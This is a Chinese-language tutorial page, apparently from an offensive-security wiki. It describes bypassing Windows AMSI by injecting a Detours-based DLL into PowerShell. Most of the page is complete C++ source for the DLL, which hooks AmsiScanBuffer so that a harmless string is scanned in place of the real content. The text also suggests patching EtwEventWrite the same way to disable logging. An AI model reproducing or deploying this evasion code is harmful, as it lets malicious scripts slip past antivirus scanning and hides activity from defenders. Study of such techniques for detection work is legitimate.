# 基于API Hook和DLL注入的AMSI绕过

## 简介

前面我们有详细的介绍过AMSI的原理和基于内存补丁的绕过方法，这次我们介绍一种略微复杂的方法，同时这种方法也可以应用于各种场景，前面我们有介绍过通过微软开源库[Detours](../persistence/detous-inline-hook.md)的inLineHook和[进程注入](../code-and-dll-process-injection/createremotethread.md)的dll注入，这次我们把这两种技术做一个组合，来实现amsi的绕过，同样的思路也可以对 EtwEventWrite进行修补，使其丧失记录日志能力。

## 流程

1. 编写一个hook AmsiScanBuffer的dll
2. 使用[dll注入](../code-and-dll-process-injection/createremotethread.md#42-dll-zhu-ru)进powershell进程
3. 完成绕过

## 代码

dll注入的代码延用[CreateRemoteThrea](../code-and-dll-process-injection/createremotethread.md)的代码。

```text
#include <Windows.h>
#include <stdio.h>
#include <amsi.h>
#include "include/detours.h"
#pragma comment(lib, "amsi.lib")
#pragma comment(lib,"lib.X64/detours.lib")

#define SafeString "SafeString"

static HRESULT(WINAPI* _AmsiScanBuffer)(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result
    ) = AmsiScanBuffer;

HRESULT WINAPI AmsiScanBuffer_(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result
) 
{
    return _AmsiScanBuffer(amsiContext, (BYTE*)SafeString, length, contentName, amsiSession, result);
}


BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (DetourIsHelperProcess()) {
        return TRUE;
    }
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)_AmsiScanBuffer, AmsiScanBuffer_);
        DetourTransactionCommit();
        printf("hook ok\n");
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)_AmsiScanBuffer, AmsiScanBuffer_);
        DetourTransactionCommit();
        break;
    }
    return TRUE;

}
```

![](../.gitbook/assets/image%20%28114%29.png)

## LINKS

{% embed url="https://x64sec.sh/understanding-and-bypassing-amsi/" %}



